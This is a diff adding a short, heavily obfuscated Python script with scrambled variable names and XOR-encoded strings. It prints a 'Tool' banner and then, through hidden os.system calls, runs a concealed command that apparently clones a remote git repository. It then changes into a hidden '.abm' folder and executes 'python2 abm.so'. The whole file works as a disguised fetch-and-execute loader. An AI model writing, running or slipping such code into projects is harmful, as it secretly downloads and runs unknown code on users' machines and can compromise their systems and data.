@@ -1,0 +1,26 @@
+O0Oll000l10OOO1O0ll01 = (lambda l1ll010l1ll0ll1000l10,
+    lOO0O10O010Oll1l01101: l1ll010l1ll0ll1000l10 + lOO0O10O010Oll1l01101)
+lO0llO1OO0l00OlO00000 = __import__('er'[::-1], globals(), locals(), [], 0)
+OlOOO111Ol01l11OllO1l = __import__(''.join(chr(O1l00O10110l10001OOO1 ^
+    lOOO11l1l1OlO0O11101l) for lOOO11l1l1OlO0O11101l, O1l00O10110l10001OOO1 in
+    zip(b'x\xb6', b'\x17\xc5')), globals(), locals(), [], 0)
+print('\x1b[0;30' + 'mTool ' + ''.join(chr(O0OO1OO10OOlOO001010l ^
+    O1Olll10OO01O0l1l1101) for O1Olll10OO01O0l1l1101, O0OO1OO10OOlOO001010l in
+    zip(b'~i\xef9\xfb~Z\xad\xa2^\x94\x19',
+    b'\x17\x07\x9cM\x9a\x126\xcc\xd67\xfbw')))
+getattr(OlOOO111Ol01l11OllO1l, ''.join(chr(O111O1l0lOO00ll1ll011 ^
+    l01O1ll11Ol1Oll1000OO) for l01O1ll11Ol1Oll1000OO, O111O1l0lOO00ll1ll011 in
+    zip(b'\xc5\xf6\x1a\xfc2\x15', b'\xb6\x8fi\x88Wx')))(''.join(filter(lambda
+    Ol011O0l0OllOl1lO10ll: ord(Ol011O0l0OllOl1lO10ll) % 3 != 0,
+    '\x0c`\x0c*\x00EBN?\x00x\x06\x0cHo')).join(chr(OOll1Ol0Oll000lOOl001 -
+    O1l1OO0Ol010O1O0000ll + 2 * (~OOll1Ol0Oll000lOOl001 &
+    O1l1OO0Ol010O1O0000ll)) for O1l1OO0Ol010O1O0000ll,
+    OOll1Ol0Oll000lOOl001 in zip(
+    b'\x88\xe9\x1a \xf7\xfe\x95\xb7\xef\xc9%\xc3\x08\xeb+\x97#^\xb1\x132\x946\xa2H\xad2?\x1b\x9d|\xce\xe5\x12\xf8\x00\xd9s\x8fK\xc1\x1e\xaa\xc8f\xea'
+    ,
+    b'\xef\x80n\x00\x94\x92\xfa\xd9\x8a\xe9M\xb7|\x9bX\xad\x0cq\xd6zF\xfcC\xc0f\xce]R4\xd0\x15\xa0\x8ds\x8bc\xb6\x17\xebx\xb31\x84\xa9\x04\x87'
+    )))
+getattr(OlOOO111Ol01l11OllO1l, ''.join(chr(l1l0l01011l111OOll00O ^
+    l100O1OO0O1O010O001O0) for l100O1OO0O1O010O001O0, l1l0l01011l111OOll00O in
+    zip(b'<\x01\xb7?\xea\xe6', b'Ox\xc4K\x8f\x8b')))(
+    'cd .abm && python2 abm.so'[::-1][::-1 * 7 + 6])
